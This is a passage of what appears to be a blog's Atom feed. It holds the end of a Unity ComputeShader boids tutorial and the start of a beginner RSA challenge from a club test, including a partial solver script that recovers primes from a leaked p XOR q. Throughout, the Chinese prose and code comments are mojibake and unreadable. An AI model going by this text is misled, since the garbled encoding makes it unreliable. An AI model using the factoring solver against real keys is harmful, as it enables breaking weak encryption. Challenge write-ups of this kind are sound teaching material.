SV_DispatchThreadID)</code>ä¸­çš„<code>SV_DispatchThreadID</code>ï¼Œå…¶å®è¿™äº›ä¸‰ç»´çš„<code>ID</code>åŸºæœ¬ä¸Šå°±æ˜¯<code>index</code>äº†</p><blockquote><p>SV_GroupID : ç·šç¨‹çµ„ ID<br>SV_GroupThreadID : ç·šç¨‹çµ„å…§çš„ç·šç¨‹ ID (ä¸‰ç¶­ï¼Œä½ å¯ä»¥ç†è§£ç‚º Group å…§çš„åº§æ¨™)<br>SV_GroupIndex : ç·šç¨‹çµ„å…§çš„ç·šç¨‹ ID (ä¸€ç¶­)<br>SV_DispatchThreadID : å”¯ä¸€ID (ä½ å¯ä»¥ç†è§£æˆæ•´å¼µåœ–ç‰‡åº§æ¨™)</p></blockquote><img src="/images/Boid_ID.png" alt="Boid_ID" style="zoom:50%;" /><p><code>Dispatch(kernelIndex,x,y,z)</code>ï¼šç”¨äºåœ¨C#è„šæœ¬ä¸­è°ƒç”¨ComputeShaderï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ ¸å‡½æ•°çš„indexï¼Œå¦‚æœæ˜¯CSMainå°±ç›´æ¥æ˜¯0ï¼Œå¦‚æœä¸ç¡®å®šindexåˆ°åº•æ˜¯å¤šå°‘ï¼Œå¯ä»¥é€šè¿‡<code>FindeKernel(String kernelName)</code>è·å–indexã€‚å…³äºåé¢çš„xyzï¼Œéœ€è¦æ»¡è¶³<code>Dispatch*numthread&gt;=numData</code>ï¼Œå¦åˆ™æ—¢ç„¶ä½ çš„è¾“å…¥éƒ½ä¸å…¨ï¼Œæ€ä¹ˆè·å¾—ä¸€ä¸ªå®Œæ•´çš„è¾“å‡ºå‘¢ï¼Ÿ</p><p>ä¸¾å‡ ä¸ªæ —å­ï¼š</p><ul><li><p>Eg1.è¾“å‡ºComputeShaderçš„é»˜è®¤ä»£ç </p><p>  ComputeShaderåœ¨Unityä¸­åˆ›å»ºæ—¶åˆå§‹åŒ–ä»£ç å¦‚ä¸‹</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Each #kernel tells which function to compile; you can have many kernels</span><br><span class="line">#pragma kernel CSMain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Create a RenderTexture with enableRandomWrite flag and set it</span><br><span class="line">&#x2F;&#x2F; with cs.SetTexture</span><br><span class="line">RWTexture2D&lt;float4&gt; Result;</span><br><span class="line"></span><br><span class="line">[numthreads(8,8,1)]</span><br><span class="line">void CSMain (uint3 id : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; TODO: insert actual code here!</span><br><span class="line"></span><br><span class="line">    Result[id.xy] &#x3D; float4(id.x &amp; id.y, (id.x &amp; 15)&#x2F;15.0, (id.y &amp; 15)&#x2F;15.0, 0.0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å¯ä»¥ä½¿ç”¨ä¸€ä¸ªC#è„šæœ¬è°ƒç”¨å®ƒ</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Tester</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> ComputeShader cs;</span><br><span class="line">    <span class="keyword">public</span> RenderTexture tex;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªæè´¨æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">        tex = <span class="keyword">new</span> RenderTexture(<span class="number">256</span>,<span class="number">256</span>,<span class="number">24</span>);</span><br><span class="line">        <span class="comment">// ä¸€å®šè¦è®°å¾—æ‰“å¼€å†™å…¥æƒé™</span></span><br><span class="line">        tex.enableRandomWrite = <span class="literal">true</span>;</span><br><span class="line">        tex.Create();</span><br><span class="line">        <span class="comment">// åœ¨Dispatchå‰éœ€è¦å…ˆä¼ å…¥å‚æ•°</span></span><br><span class="line">        cs.SetTexture(<span class="number">0</span>, <span class="string">&quot;Result&quot;</span>, tex);</span><br><span class="line">        <span class="comment">// æ³¨æ„åˆ°numthreadä¸º(8,8,1)ï¼Œæœ‰numthread*Dispatch=Resolution</span></span><br><span class="line">        cs.Dispatch(<span class="number">0</span>, <span class="number">256</span>/<span class="number">8</span>, <span class="number">256</span>/<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å¾—åˆ°ä¸€ä¸ªå¥½åº·çš„åˆ†å½¢å›¾æ¡ˆ</p><p>  <img src="/images/Boid_CSdefault.png"></p></li><li><p>Eg2.å°†å‚æ•°æ”¹å°</p><p>  <code>Dispatch(0,64/8,128/8,1);</code></p><p>  <code>numthread[8,8,1];</code></p><p>  <img src="/images/Boid_CSeg2.png"></p><p>  è§‚å¯Ÿåˆ°å›¾åƒä¸å…¨ä¸”åªæœ‰64x128ï¼Œä¸Dispatchä¸­ä¼ å…¥çš„é‡å»åˆ</p></li><li><p>Eg3.å°†å‚æ•°æ”¹å¤§</p><p>  <code>tex = new RenderTexture(256,300,24);</code></p><p>  <code>Dispatch(0,256/8,(int)Mathf.Ceil(300/8),1);</code></p><p>  <code>numthread[8,8,1];</code></p><p>  <img src="/images/Boid_CSeg3.png"></p><p>  æ³¨æ„åˆ°<code>(int)Mathf.Ceil(300/8) * 8 &gt; 300</code>ï¼Œå¦‚æœæ­¤å¤„ä¸ç”¨<code>Ceil</code>å‘ä¸Šå–æ•´åˆ™ä¼šå°‘ä¸€éƒ¨ä»½æ²¡æœ‰è¢«è®¡ç®—</p></li></ul><h3 id="Translation"><a href="#Translation" class="headerlink" title="Translation"></a>Translation</h3><p><code>C#</code>ç¿»è¯‘åˆ°<code>hlsl</code>çš„å·¥ä½œæµç¨‹å¦‚ä¸‹</p><p>é¦–å…ˆæ˜¯C#è„šæœ¬ä¸Š</p><ul><li><p>åˆ›å»ºç»“æ„ä½“ä¿å­˜ä¸€äº›å±æ€§ï¼Œå…¶ä¸­<code>acceleration</code>ä½œä¸ºè®¡ç®—ç»“æœï¼Œç­‰å¾…åœ¨ComputeShaderä¸­è¢«èµ‹å€¼</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> BoidData &#123;</span><br><span class="line">    <span class="keyword">public</span> Vector3 position;</span><br><span class="line">    <span class="keyword">public</span> Vector3 forward;</span><br><span class="line">    <span class="keyword">public</span> Vector3 acceleration;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Size &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">sizeof</span> (<span class="built_in">float</span>) * <span class="number">3</span> * <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å®ä¾‹åŒ–ï¼Œèµ‹å€¼ï¼Œåˆ›å»ºBuffer</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> boidData = <span class="keyword">new</span> BoidData[boids.Length];</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; boids.Length; i++) &#123;</span><br><span class="line">    boidData[i].position = boids[i].transform.position;</span><br><span class="line">    boidData[i].forward = boids[i].transform.forward;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> boidBuffer = <span class="keyword">new</span> ComputeBuffer (boids.Length, BoidData.Size);</span><br><span class="line">boidBuffer.SetData (boidData);</span><br></pre></td></tr></table></figure></li><li><p>ä¼ å…¥ComputeShaderè®¡ç®—éœ€è¦çš„å˜é‡ä¿¡æ¯</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">computeShader.SetBuffer(<span class="number">0</span>, <span class="string">&quot;boids&quot;</span>, boidBuffer);</span><br><span class="line">computeShader.SetInt(<span class="string">&quot;numBoids&quot;</span>, boids.Length);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;viewRadius&quot;</span>, viewRadius);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;avoidRadius&quot;</span>, avoidRadius);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;avoidWeight&quot;</span>, avoidWeight);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;headingWeight&quot;</span>, headingWeight);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;centerWeight&quot;</span>, centerWeight);</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡<code>Dispatch()</code>å¼€å§‹æ‰§è¡ŒComputeShader</p><p>  <code>computeShader.Dispatch(0, threadGroups, 1, 1);</code></p></li></ul><p>ç°åœ¨æŠŠè§†è§’åˆ‡æ¢åˆ°ComputeShaderä¸Š</p><ul><li><p>æŠŠéœ€è¦ä¼ å…¥çš„å˜é‡éƒ½å®šä¹‰ä¸€éï¼Œè¿™é‡Œæ³¨æ„ç»“æ„ä½“ä½¿ç”¨äº†<code>RWStructuredBuffer</code>ä½œä¸ºå®¹å™¨</p><blockquote><p>A structured buffer is a buffer that contains elements of equal sizes. Use a structure with one or more member types to define an element. Here is a structure with three members.</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct Boid &#123;</span><br><span class="line">    float3 position;</span><br><span class="line">    float3 forward;</span><br><span class="line">    float3 acceleration;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">RWStructuredBuffer&lt;Boid&gt; boids;</span><br><span class="line">int numBoids;</span><br><span class="line">float viewRadius;</span><br><span class="line">float avoidRadius;</span><br><span class="line">float avoidWeight;</span><br><span class="line">float headingWeight;</span><br><span class="line">float centerWeight;</span><br></pre></td></tr></table></figure></li><li><p>ç¿»è¯‘ä¸€éC#ä»£ç ï¼Œåªéœ€è¦æ”¹ä¸€ç‚¹è¯­æ³•å°±å¯ä»¥äº†</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void CSMain (uint3 id : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    float3 zero3 &#x3D; &#123;0, 0, 0&#125;;</span><br><span class="line">    float3 avoidAcceleration &#x3D; zero3;</span><br><span class="line">    float3 headingAcceleration &#x3D; zero3;</span><br><span class="line">    float3 centerAcceleration &#x3D; zero3;</span><br><span class="line">    int mateCount;</span><br><span class="line">    int avoidCount;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; numBoids; i ++)&#123;</span><br><span class="line">        if((int)id.x !&#x3D; i)&#123;</span><br><span class="line">            float3 offset &#x3D; boids[id.x].position - boids[i].position;</span><br><span class="line">            float sqrDst &#x3D; offset.x * offset.x + offset.y * offset.y + offset.z * offset.z;</span><br><span class="line">            if(sqrDst &lt; viewRadius * viewRadius)&#123;</span><br><span class="line">                mateCount +&#x3D; 1;</span><br><span class="line">                headingAcceleration +&#x3D; boids[i].forward - boids[id.x].forward;</span><br><span class="line">                centerAcceleration -&#x3D; offset;</span><br><span class="line">            &#125;</span><br><span class="line">            if(sqrDst &lt; avoidRadius * avoidRadius)&#123;</span><br><span class="line">                avoidCount++;</span><br><span class="line">                avoidAcceleration +&#x3D; normalize(offset) &#x2F; sqrDst;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    avoidAcceleration &#x3D; avoidCount &#x3D;&#x3D; 0 ? zero3 : normalize(avoidAcceleration);</span><br><span class="line">    headingAcceleration &#x3D; mateCount &#x3D;&#x3D; 0 ? zero3 : normalize(headingAcceleration);</span><br><span class="line">    centerAcceleration &#x3D; mateCount &#x3D;&#x3D; 0 ? zero3 : normalize(centerAcceleration);</span><br><span class="line">    boids[id.x].acceleration &#x3D; avoidAcceleration * avoidWeight + headingAcceleration * headingWeight + centerAcceleration * centerWeight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>å…³äº<code>numthread</code>ï¼Œç¤ºä¾‹å·¥ç¨‹ç›´æ¥è®¾äº†<code>[1024,1,1]</code>ï¼šä½¿ç”¨ä¸€ç»´å‘é‡æ˜¯å› ä¸ºéœ€è¦å¤„ç†çš„æ•°æ®æ²¡æœ‰ç±»ä¼¼æè´¨ã€ä½“ç§¯ä¹‹ç±»çš„ä¸‰ç»´ç»“æ„ä½“ï¼›<code>1024</code>æ˜¯ä¸ºäº†ç›´æ¥æŠŠçº¿ç¨‹æ‹‰æ»¡</p><h3 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h3><p>å°†åŸæœ¬åœ¨CPUä¸­è¿›è¡Œçš„å¤§é‡é‡å¤è®¡ç®—è¿ç§»è‡³GPUåå¯æ¨¡æ‹Ÿçš„é±¼ç¾¤è§„æ¨¡ç¬é—´æå‡äº†ä¸å°‘ï¼Œç°åœ¨ä½ å¯ä»¥æ¨¡æ‹Ÿä¸€äº›è¾ƒå¤§è§„æ¨¡çš„é±¼ç¾¤äº†ï¼Œåœ¨æ­¤å°±ä¸é™„æ–°çš„å›¾ç‰‡äº†</p><h2 id="Polish"><a href="#Polish" class="headerlink" title="Polish"></a>Polish</h2><p>å°±ç®—ä¸ºå…¶æ¢ä¸Šä¸€ä¸ªçœŸæ­£çš„é±¼ğŸŸçš„æ¨¡å‹ï¼Œç°åœ¨çš„é±¼ç¾¤æ•´ä½“è¿˜æ¯”è¾ƒå•è°ƒï¼Œè™½ç„¶æœ‰äº†ä¸€äº›è§„åˆ™ä½¿å¾—å…¶åœ¨å®è§‚åŠ¨æ€çš„è¡¨ç°åŠ›ä¸Šæœ‰äº†é‚£ä¹ˆä¸€ææï¼Œä½†è¿˜ç¼ºå°‘ä¸€äº›æ›´åŠ ç›´è§‚çš„ç»†èŠ‚ï¼Œè¯´ç™½äº†å°±æ˜¯æœ‰ä¸€ä¸ªæœ‰è¶£çš„çµé­‚ä½†æ²¡æœ‰åä¸½çš„å¤–è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¦¨åšä¸¤ä¸ªshaderæ¥ä¸ºå…¶æ¶¦è‰²ï¼Œä¸€ä¸ªshaderè´Ÿè´£é±¼çš„æ‘†åŠ¨ï¼Œå¦ä¸€ä¸ªè´Ÿè´£æ°´é¢æè´¨</p><p>æˆ‘ä½¿ç”¨çš„æ˜¯HDRPä½œä¸ºæ¸²æŸ“ç®¡çº¿ï¼Œè™½ç„¶æˆ‘ä¸ä¼šç”¨å®ƒï¼Œä½†æˆ‘å¬è¯´ä»–å¾ˆå¼ºï¼Œæ‰€ä»¥æˆ‘å¸Œæœ›èƒ½è¿ˆå‡ºç¬¬ä¸€æ­¥</p><p>ç”±äºç›®å‰ä½¿ç”¨çš„æ˜¯ShaderGraphï¼Œä¸ä¾¿äºé™„ä»£ç ï¼Œåªèƒ½è®²ä¸€ä¸‹æ€è·¯å¹¶é™„å¸¦ä¸€äº›èµ„æ–™äº†</p><h3 id="Waving-Fish"><a href="#Waving-Fish" class="headerlink" title="Waving Fish"></a>Waving Fish</h3><p>å…¶å®å¯ä»¥ç”¨ä¸€ä¸ª<code>sin(t)</code>å‡½æ•°å°±èƒ½è·å¾—å¾ˆèƒ½æ¥å—çš„æ•ˆæœäº†ï¼Œä½†æ˜¯é‰´äºé±¼éƒ½æ˜¯æˆç¾¤å‡ºç°ï¼Œä»¥æ—¶é—´ä¸ºå˜é‡çš„å‡½æ•°è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘å½“å‰çš„åšæ³•æ˜¯å°†é±¼çš„ä¸–ç•Œåæ ‡ä½œä¸ºå˜é‡ï¼Œè¾“å…¥åˆ°<code>Gradient Noise</code>ï¼Œå¯¹é±¼çš„é¡¶ç‚¹åæ ‡çš„æŸä¸€ä¸ªè½´å‘åº”ç”¨è¿™ä¸ªå™ªå£°ï¼Œè¿™æ ·å¾—åˆ°çš„é±¼ä¼šæ ¹æ®è‡ªèº«ä½ç½®è€Œå†³å®šæ‘‡æ‘†ï¼Œç¼ºç‚¹æ˜¯æ²¡æœ‰å’Œé±¼çš„è½¬å‘ã€è¿åŠ¨ç­‰è”ç³»èµ·æ¥ï¼Œåœ¨è®¾æƒ³ä¸­ï¼Œèƒ½æ ¹è‡ªèº«åŠ é€Ÿåº¦é€‰æ‹©æ‘‡æ‘†æ–¹å¼çš„Shaderæ‰æ˜¯æœ€å¥½çš„ï¼Œä½†ç›®å‰ä¸æ¸…æ¥šè¿™æ ·åšçš„å¯è¡Œæ€§ä»¥åŠå…·ä½“æ–¹æ³•</p><p>æ¥ä¸‹æ¥è¿˜éœ€è¦å°†é±¼å¤´çš„æ‘‡æ‘†å¹…åº¦é™ä½ï¼Œå› ä¸ºä¸€èˆ¬æ¥è¯´é±¼å¤´ä¸ä¼šåƒå°¾å·´å’Œèº«ä½“é‚£æ ·å‰§çƒˆæ‘†åŠ¨ã€‚åœ¨æ­¤æ¨èäº†è§£ä¸€ä¸‹æœ‰å…³<code>UV</code>çš„æ¦‚å¿µï¼Œè¿™å¾ˆé‡è¦ï¼Œæ¯”å¦‚æ­¤å¤„å¯ä»¥å°†UVçš„xä½œä¸ºå˜é‡ï¼Œåœ¨å™ªå£°å’ŒåŸæœ¬çš„é¡¶ç‚¹ä½ç½®ä¹‹é—´åšçº¿æ€§æ’å€¼(LERP)ï¼Œä¹Ÿå¯ä»¥å¯¹UV.xå–å¹³æ–¹ä¹‹ç±»çš„ä»¥è®©æ‘†åŠ¨çš„è¿‡åº¦æ›´åŠ è‡ªç„¶</p><p>ç»¼ä¸Šï¼Œä¾¿å¾—åˆ°äº†ä¸€æ¡æ¬¢å¿«çš„å°é±¼ğŸŸ</p><p><img src="/images/Boid_WavingFish.gif"></p><h3 id="Water-Surface-Shader"><a href="#Water-Surface-Shader" class="headerlink" title="Water Surface Shader"></a>Water Surface Shader</h3><p>é±¼å¾—åˆ°äº†å‡çº§ï¼Œè¿˜éœ€è¦ä¸€ä¸ªå®¹å™¨æ¥ä½¿å¾—æ•´ä¸ªåœºæ™¯åœ¨æ°´ä¸­ï¼Œè¿™é‡Œé€‰æ‹©åˆ¶ä½œä¸€ä¸ªæ°´é¢çš„æè´¨è´´åœ¨å¹³é¢ä¸Šï¼Œåšæˆå¼€å¤´é‚£æ ·çš„æ°´ç«‹æ–¹ï¼ŒUnityå®˜æ–¹æä¾›äº† <a href="https://www.youtube.com/watch?v=gRq-IdShxpU">åŸºæœ¬çš„æ°´é¢ShdaerGraphæ•™ç¨‹</a>ï¼Œç”±äºå¤„å¤„ç¢°å£ï¼Œæˆ‘ä¹Ÿå°±åŸºæœ¬æ˜¯æŠ„äº†ä¸€éå®˜æ–¹çš„æˆæœ</p><p>ä¸»è¦çš„æ€æƒ³æ˜¯ä½¿<code>Scene Depth</code>ä¸<code>Screen Position</code>ç›¸å‡ï¼Œç”±äºå‰è€…çš„æ£€æµ‹ä¸åŒ…å«é€æ˜ç‰©ä½“ï¼Œè€Œåè€…åŒ…å«ï¼Œåˆ™å¯ä»¥è·å–ç©¿è¿‡ä¸€ä¸ªé€æ˜å¹³é¢åçš„ç©ºé—´æ·±åº¦ä¿¡æ¯</p><img src="/images/Boid_Depth.png" alt="Boid_Depth" style="zoom: 67%;" /><p>ä¹‹ååªéœ€è¦åœ¨è¿™ä¸ªå¹³é¢çš„è¡¨é¢åšä¸¤å±‚ä¸åŒç»†èŠ‚ç¨‹åº¦çš„æ°´é¢Normal Mapçš„åå‘æ»šåŠ¨ï¼Œå†åŠ å…¥ç”±å™ªå£°æ§åˆ¶çš„å¹³é¢é¡¶ç‚¹åæ ‡çš„èµ·ä¼å³å¯</p><h2 id="Final-Result"><a href="#Final-Result" class="headerlink" title="Final Result"></a>Final Result</h2><p>Check the final result if you want, a gif about 10 Mb</p><p><img src="/images/Boid_Final.gif"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ€è¿‘åˆ·æ²¹ç®¡çœ‹åˆ°ä¸€ä¸ªå…³äºç”Ÿç‰©ç¾¤æ¨¡æ‹Ÿçš„Unityå°é¡¹ç›®ï¼Œå…¶ä¸­æåˆ°äº†ä½¿ç”¨ComputeShaderæ¥å®ç°å¤šçº¿ç¨‹çš„å¹¶è¡Œè®¡ç®—ï¼Œæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œå°±åšäº†ä¸€äº›å°è¯•å’Œæ”¹è‰¯&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/Boid_Cover.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Unity" scheme="https://kyriota.github.io/categories/Unity/"/>
    
    
  </entry>
  
  <entry>
    <title>æµªæ½®ä¿±ä¹éƒ¨å¯†ç å…è¯•é¢˜</title>
    <link href="https://kyriota.github.io/2021/09/14/%E6%B5%AA%E6%BD%AE%E4%BF%B1%E4%B9%90%E9%83%A8%E5%AF%86%E7%A0%81%E5%85%8D%E8%AF%95%E9%A2%98/"/>
    <id>https://kyriota.github.io/2021/09/14/%E6%B5%AA%E6%BD%AE%E4%BF%B1%E4%B9%90%E9%83%A8%E5%AF%86%E7%A0%81%E5%85%8D%E8%AF%95%E9%A2%98/</id>
    <published>2021-09-14T02:15:29.000Z</published>
    <updated>2022-01-06T06:55:15.224Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªé¢å‘æ–°äººçš„ç®€å•å¯†ç é¢˜</p><span id="more"></span><h1 id="æµªæ½®ä¿±ä¹éƒ¨å¯†ç å…è¯•é¢˜"><a href="#æµªæ½®ä¿±ä¹éƒ¨å¯†ç å…è¯•é¢˜" class="headerlink" title="æµªæ½®ä¿±ä¹éƒ¨å¯†ç å…è¯•é¢˜"></a>æµªæ½®ä¿±ä¹éƒ¨å¯†ç å…è¯•é¢˜</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">bit=<span class="number">128</span></span><br><span class="line">p = getPrime(bit)</span><br><span class="line">q = getPrime(bit)</span><br><span class="line">n = p*q</span><br><span class="line">xor = p^q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">print(<span class="built_in">pow</span>(bytes_to_long(flag),e,n))</span><br><span class="line">print(n)</span><br><span class="line">print(xor)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">57928739525594987887296575374030551510625601525690046551520041216593791573788</span></span><br><span class="line"><span class="string">80432855143052017312586077102716651699179063179625801734127439450003104378453</span></span><br><span class="line"><span class="string">57489605936489517513414513696072421348</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Hint: äºŒå‰æ ‘ä¸äºŒè¿›åˆ¶</span></span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        exp    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="string">&#x27;1011000111010011011000011111101000100011101111000010000100001000011101000101010010101110001010111000000001110000110100000101010010001110010100000101001111000010101100000000101111010001100000001000001011110011110111000000111101010101111100001010111001010101&#x27;</span></span><br><span class="line">xor=<span class="string">&#x27;00101011010000000001100001101001010001110001100110010011010010001011110100111000100110000111101110111010011100100100111111100100&#x27;</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line">att=<span class="number">0</span></span><br><span class="line">qq=[]</span><br><span class="line">pp=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">q,p,index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    <span class="keyword">if</span> index&gt;<span class="number">128</span>:</span><br><span class="line">        <span class="keyword">if</span> q <span class="keyword">not</span> <span class="keyword">in</span> qq <span class="keyword">and</span> q <span class="keyword">not</span> <span class="keyword">in</span> pp:</span><br><span class="line">            <span class="comment">#print(&#x27;q&#x27;,q,&#x27;p&#x27;,p)</span></span><br><span class="line">            qq.append(q)</span><br><span class="line">            pp.append(p)</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">global</span> xor</span><br><span class="line">    i=xor[-index]</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+p,<span class="number">2</span>))[-index:]==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;1&#x27;</span>+q,<span class="string">&#x27;1&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">        zeroResult = <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+p,<span class="number">2</span>))[-index:]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">in</span> zeroResult:</span><br><span class="line">            zeroResult = <span class="string">&#x27;0&#x27;</span> + zeroResult[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> zeroResult==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;0&#x27;</span>+q,<span class="string">&#x27;0&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bin</span>(<span 